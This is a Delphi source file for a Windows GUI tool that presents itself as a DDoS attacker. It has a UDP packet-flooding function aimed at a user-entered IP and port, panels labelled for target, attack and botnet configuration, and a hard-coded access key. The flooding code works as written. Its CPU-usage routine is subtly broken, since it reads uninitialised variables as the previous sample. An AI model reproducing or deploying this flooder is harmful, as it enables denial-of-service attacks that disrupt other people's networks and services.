// Char code --ANSI-- --UTF8--
unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Winapi.Winsock, Vcl.Menus,
  Vcl.ComCtrls, VclTee.TeeGDIPlus, Vcl.ExtCtrls, VclTee.TeEngine,
  VclTee.TeeProcs, VclTee.Chart, VclTee.Series, System.DateUtils,
  Vcl.Imaging.pngimage;

type
  TForm1 = class(TForm)
    Edit1: TEdit;
    Edit2: TEdit;
    Edit3: TEdit;
    Button1: TButton;
    Memo1: TMemo;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    GroupBox1: TGroupBox;
    GroupBox2: TGroupBox;
    Edit4: TEdit;
    Label4: TLabel;
    Label5: TLabel;
    Edit5: TEdit;
    Label6: TLabel;
    Edit6: TEdit;
    GroupBox3: TGroupBox;
    RadioButton1: TRadioButton;
    Label7: TLabel;
    Label8: TLabel;
    Edit7: TEdit;
    Button2: TButton;
    MainMenu1: TMainMenu;
    Application1: TMenuItem;
    Saves1: TMenuItem;
    Exit1: TMenuItem;
    GroupBox4: TGroupBox;
    Button3: TButton;
    Button4: TButton;
    SaveEntry1: TMenuItem;
    NewEntry: TMenuItem;
    N1: TMenuItem;
    SaveEntry0: TMenuItem;
    SaveEntry2: TMenuItem;
    ProgressBar1: TProgressBar;
    Chart1: TChart;
    Timer1: TTimer;
    SeriesCPU: TLineSeries;
    DisconnectSocket1: TMenuItem;
    DisconnectBotnet1: TMenuItem;
    N2: TMenuItem;
    CloseApp: TMenuItem;
    Reload1: TMenuItem;
    N3: TMenuItem;
    Chart2: TMenuItem;
    ReloadOutput: TMenuItem;
    HighlightOutput: TMenuItem;
    ChangeType: TMenuItem;
    ChartRecord: TMenuItem;
    N4: TMenuItem;
    ChangeBackground1: TMenuItem;
    ChangeBGBlackRed: TMenuItem;
    ChangeBGBlackGreen: TMenuItem;
    ChangeBGBlack: TMenuItem;
    ChangeBGWhite: TMenuItem;
    Chartspeed: TMenuItem;
    N1000: TMenuItem;
    N750: TMenuItem;
    N500: TMenuItem;
    N50: TMenuItem;
    procedure Button1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Edit7Change(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure SaveEntry0Click(Sender: TObject);
    procedure SaveEntry1Click(Sender: TObject);
    procedure SaveEntry2Click(Sender: TObject);
    procedure Memo1Change(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure CloseAppClick(Sender: TObject);
    procedure ReloadOutputClick(Sender: TObject);
    procedure ChartRecordClick(Sender: TObject);
    procedure ChangeBGWhiteClick(Sender: TObject);
    procedure ChangeBGBlackClick(Sender: TObject);
    procedure ChangeBGBlackGreenClick(Sender: TObject);
    procedure ChangeBGBlackRedClick(Sender: TObject);
    procedure N1000Click(Sender: TObject);
    procedure N750Click(Sender: TObject);
    procedure N500Click(Sender: TObject);
    procedure N50Click(Sender: TObject);
  private
    function SendDDoSPackets(const TargetIP: string;
      TargetPort, NumPackets: Integer): Boolean;
    procedure AppendToStatusArea(const Text: string);
    function GetCPUUsage: Double;
  public
    { Public-Deklarationen }
  end;

var
  Form1: TForm1;
  Accepted: Integer;
  StartTime: TDateTime;

implementation

{$R *.dfm}

function TForm1.GetCPUUsage: Double;
var
  IdleTime, KernelTime, UserTime: TFileTime;
  SysIdleTime, SysKernelTime, SysUserTime: Int64;
  PrevSysIdleTime, PrevSysKernelTime, PrevSysUserTime: Int64;
  CurrentSysIdleTime, CurrentSysKernelTime, CurrentSysUserTime: Int64;
  TotalSysTime, IdleSysTime: Int64;
  CPUUsage: Double;
begin
  Result := 0.0;

  if GetSystemTimes(IdleTime, KernelTime, UserTime) then
  begin
    PrevSysIdleTime := SysIdleTime;
    PrevSysKernelTime := SysKernelTime;
    PrevSysUserTime := SysUserTime;

    SysIdleTime := Int64(IdleTime);
    SysKernelTime := Int64(KernelTime);
    SysUserTime := Int64(UserTime);

    TotalSysTime := (SysKernelTime + SysUserTime) - (PrevSysKernelTime + PrevSysUserTime);
    IdleSysTime := SysIdleTime - PrevSysIdleTime;

    if TotalSysTime > 0 then
    begin
      CPUUsage := (1.0 - (IdleSysTime / TotalSysTime)) * 100.0;
      Result := CPUUsage;
    end;
  end;
end;


procedure TForm1.AppendToStatusArea(const Text: string);
begin
  Memo1.Lines.Add(Text);
end;

procedure TForm1.SaveEntry0Click(Sender: TObject);
begin
  Edit1.Text := '127.0.0.1';
  Edit2.Text := '80';
  Edit4.Text := 'localhost';

  Edit3.Text := '8192';
  Edit5.Text := '4096';
  Edit6.Text := 'UDP';
end;

procedure TForm1.SaveEntry1Click(Sender: TObject);
begin
  Edit1.Text := '127.0.0.1';
  Edit2.Text := '80';
  Edit4.Text := 'localhost';

  Edit3.Text := '512';
  Edit5.Text := '1024';
  Edit6.Text := 'UDP';
end;

procedure TForm1.SaveEntry2Click(Sender: TObject);
begin
  Edit1.Text := '192.168.178.1';
  Edit2.Text := '255';
  Edit4.Text := 'Subnet mask';

  Edit3.Text := '8192';
  Edit5.Text := '4096';
  Edit6.Text := 'TCP';
end;

function TForm1.SendDDoSPackets(const TargetIP: string;
  TargetPort, NumPackets: Integer): Boolean;
var
  WSAData: TWSAData;
  Socket: TSocket;
  IPAddress: ULONG;
  PacketData: array [0 .. 1023] of Byte;
  Packet: TSockAddrIn;
  I: Integer;
begin
  Result := False;

  if WSAStartup(MAKEWORD(2, 2), WSAData) <> 0 then
  begin
    AppendToStatusArea('Failed to initialize Winsock.');
    Exit;
  end;

  Socket := Winapi.Winsock.Socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if Socket = INVALID_SOCKET then
  begin
    AppendToStatusArea('Failed to create socket.');
    WSACleanup;
    Exit;
  end;

  IPAddress := inet_addr(PAnsiChar(AnsiString(TargetIP)));
  if IPAddress = INADDR_NONE then
  begin
    AppendToStatusArea('Invalid IP address: ' + TargetIP);
    closesocket(Socket);
    WSACleanup;
    Exit;
  end;

  FillChar(PacketData, SizeOf(PacketData), 0);

  Packet.sin_family := AF_INET;
  Packet.sin_addr.S_addr := IPAddress;
  Packet.sin_port := htons(TargetPort);

  for I := 1 to NumPackets do
  begin
    if sendto(Socket, PacketData, SizeOf(PacketData), 0, Packet, SizeOf(Packet))
      = SOCKET_ERROR then
    begin
      AppendToStatusArea('Failed to send packet: ' +
        SysErrorMessage(WSAGetLastError));
      closesocket(Socket);
      WSACleanup;
      Exit;
    end;

    AppendToStatusArea('Packet sent to ' + TargetIP + ':' +
      IntToStr(TargetPort));
  end;

  AppendToStatusArea('DDoS attack completed.');
  ProgressBar1.Position := 100;

  closesocket(Socket);
  WSACleanup;
  Result := True;
end;

procedure TForm1.Timer1Timer(Sender: TObject);
var
  CPUUsage: Double;
  TimeElapsed: Double;
begin
  CPUUsage := GetCPUUsage;
  SeriesCPU.Add(CPUUsage);

  TimeElapsed := SecondsBetween(Now, StartTime);

  Chart1.BottomAxis.Maximum := TimeElapsed;

  SeriesCPU.Repaint;
end;
procedure TForm1.Button1Click(Sender: TObject);
var
  TargetIP: string;
  TargetPort, NumPackets: Integer;
begin
  TargetIP := Edit1.Text;
  TargetPort := StrToIntDef(Edit2.Text, 80);
  NumPackets := StrToIntDef(Edit3.Text, 1000);

  if SendDDoSPackets(TargetIP, TargetPort, NumPackets) then
    ShowMessage('DDoS attack completed.')
  else
    ShowMessage('Failed to perform DDoS attack.');
end;

procedure TForm1.Button2Click(Sender: TObject);
begin

  Button2.Enabled := False;

  if Edit7.Text = 'BAK-201-000-328-249' then
  begin
    ShowMessage('access granted');
    Accepted := 1;
    Label7.Visible := False;
    RadioButton1.Checked := True;
    Edit7.Enabled := False;
  end
  else
  begin
    ShowMessage('Invalid access key.');
    Accepted := 0;
    Edit7.Text := '';
  end;
end;

procedure TForm1.Button3Click(Sender: TObject);
begin
  Memo1.Clear;
  ProgressBar1.Position := 0;

end;

var
  TimerEnabled: Boolean;

procedure TForm1.ChangeBGBlackClick(Sender: TObject);
begin
  ChangeBGBlack.Default := True;
  Form1.Color := clBlack;

  GroupBox1.Font.Color := clWhite;
  GroupBox1.Caption := '';

  GroupBox2.Font.Color := clWhite;
  GroupBox2.Caption := '';

  GroupBox3.Font.Color := clWhite;
  GroupBox3.Caption := '';

  GroupBox4.Font.Color := clWhite;
  GroupBox4.Caption := '';

  Memo1.Color := clBlack;
  Memo1.Font.Color := clWhite;

  Edit1.Color := clBlack;
  Edit1.Font.Color := clWhite;

  Edit2.Color := clBlack;
  Edit2.Font.Color := clWhite;

  Edit3.Color := clBlack;
  Edit3.Font.Color := clWhite;

  Edit4.Color := clBlack;
  Edit4.Font.Color := clWhite;

  Edit5.Color := clBlack;
  Edit5.Font.Color := clWhite;

  Edit6.Color := clBlack;
  Edit6.Font.Color := clWhite;

  Edit7.Color := clBlack;
  Edit7.Font.Color := clWhite;

  Chart1.Color := clBlack;
  Chart1.BottomAxis.Title.Color := clWhite;
end;

procedure TForm1.ChangeBGBlackGreenClick(Sender: TObject);
begin
  ChangeBGBlackGreen.Default := True;
  Form1.Color := clBlack;

  GroupBox1.Font.Color := clLime;
  GroupBox1.Caption := '';

  GroupBox2.Font.Color := clLime;
  GroupBox2.Caption := '';

  GroupBox3.Font.Color := clLime;
  GroupBox3.Caption := '';

  GroupBox4.Font.Color := clLime;
  GroupBox4.Caption := '';

  Memo1.Color := clBlack;
  Memo1.Font.Color := clLime;

  Edit1.Color := clBlack;
  Edit1.Font.Color := clLime;

  Edit2.Color := clBlack;
  Edit2.Font.Color := clLime;

  Edit3.Color := clBlack;
  Edit3.Font.Color := clLime;

  Edit4.Color := clBlack;
  Edit4.Font.Color := clLime;

  Edit5.Color := clBlack;
  Edit5.Font.Color := clLime;

  Edit6.Color := clBlack;
  Edit6.Font.Color := clLime;

  Edit7.Color := clBlack;
  Edit7.Font.Color := clLime;

  Chart1.Color := clBlack;
  Chart1.BottomAxis.Title.Color := clLime;
end;

procedure TForm1.ChangeBGBlackRedClick(Sender: TObject);
begin
  ChangeBGBlackRed.Default := True;
  Form1.Color := clBlack;

  GroupBox1.Font.Color := clRed;
  GroupBox1.Caption := '';

  GroupBox2.Font.Color := clRed;
  GroupBox2.Caption := '';

  GroupBox3.Font.Color := clRed;
  GroupBox3.Caption := '';

  GroupBox4.Font.Color := clRed;
  GroupBox4.Caption := '';

  Memo1.Color := clBlack;
  Memo1.Font.Color := clRed;

  Edit1.Color := clBlack;
  Edit1.Font.Color := clRed;

  Edit2.Color := clBlack;
  Edit2.Font.Color := clRed;

  Edit3.Color := clBlack;
  Edit3.Font.Color := clRed;

  Edit4.Color := clBlack;
  Edit4.Font.Color := clRed;

  Edit5.Color := clBlack;
  Edit5.Font.Color := clRed;

  Edit6.Color := clBlack;
  Edit6.Font.Color := clRed;

  Edit7.Color := clBlack;
  Edit7.Font.Color := clRed;

  Chart1.Color := clBlack;
  Chart1.BottomAxis.Title.Color := clRed;
end;

procedure TForm1.ChangeBGWhiteClick(Sender: TObject);
begin
ChangeBGWhite.Default := True;
  Form1.Color := clWhite;

  GroupBox1.Font.Color := clBlack;
  GroupBox1.Caption := 'Configure target:';

  GroupBox2.Font.Color := clBlack;
  GroupBox2.Caption := 'Configure attack:';

  GroupBox3.Font.Color := clBlack;
  GroupBox3.Caption := 'Botnet:';

  GroupBox4.Font.Color := clBlack;
  GroupBox4.Caption := 'Attack surveillance:';

  Memo1.Color := clWhite;
  Memo1.Font.Color := clBlack;

  Edit1.Color := clWhite;
  Edit1.Font.Color := clBlack;

  Edit2.Color := clWhite;
  Edit2.Font.Color := clBlack;

  Edit3.Color := clWhite;
  Edit3.Font.Color := clBlack;

  Edit4.Color := clWhite;
  Edit4.Font.Color := clBlack;

  Edit5.Color := clWhite;
  Edit5.Font.Color := clBlack;

  Edit6.Color := clWhite;
  Edit6.Font.Color := clBlack;

  Edit7.Color := clWhite;
  Edit7.Font.Color := clBlack;

  Chart1.Color := clWhite;
  Chart1.BottomAxis.Title.Color := clBlack;
end;

procedure TForm1.ChartRecordClick(Sender: TObject);
begin
  TimerEnabled := not TimerEnabled;

  if TimerEnabled then
  begin
    Timer1.Enabled := False;
    ChartRecord.Caption := 'Start Record [OFF]';
  end
  else
  begin
    Timer1.Enabled := True;
    ChartRecord.Caption := 'Stop Record [ON]';
  end;
end;

procedure TForm1.CloseAppClick(Sender: TObject);
begin
  Application.Terminate;
end;

procedure TForm1.Edit7Change(Sender: TObject);
begin
  Button2.Enabled := True;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  Accepted := 0;

  Chart1.View3D := False;

  SeriesCPU := TLineSeries.Create(Chart1);
  SeriesCPU.ParentChart := Chart1;
  SeriesCPU.Title := 'CPU Usage';
  SeriesCPU.Pointer.Visible := True;
  SeriesCPU.Pointer.Style := psSmallDot;
  SeriesCPU.ShowInLegend := False;

  Chart1.AddSeries(SeriesCPU);

  Chart1.LeftAxis.Title.Caption := 'CPU Usage (%)';
  Chart1.LeftAxis.AxisValuesFormat := '0';

  Chart1.BottomAxis.Title.Caption := 'Time (s)';

  Chart1.LeftAxis.Minimum := 0;
  Chart1.LeftAxis.Maximum := 100;

  Chart1.BottomAxis.Increment := 1;

  Chart1.AutoRepaint := True; // Aktiviere automatisches Neuzeichnen

  Timer1.Interval := 1000;
  StartTime := Now;
end;

procedure TForm1.Memo1Change(Sender: TObject);
begin
  ProgressBar1.Position := 5;
end;

procedure TForm1.N1000Click(Sender: TObject);
begin
  N1000.Default := True;
  Timer1.Interval := 1000;
end;

procedure TForm1.N500Click(Sender: TObject);
begin
  N500.Default := True;
  Timer1.Interval := 500;
end;

procedure TForm1.N50Click(Sender: TObject);
begin
  N50.Default := True;
  Timer1.Interval := 50;
end;

procedure TForm1.N750Click(Sender: TObject);
begin
  N750.Default := True;
  Timer1.Interval := 750;
end;

procedure TForm1.ReloadOutputClick(Sender: TObject);
begin
  SeriesCPU.Clear;
  StartTime := Now;
end;

end.
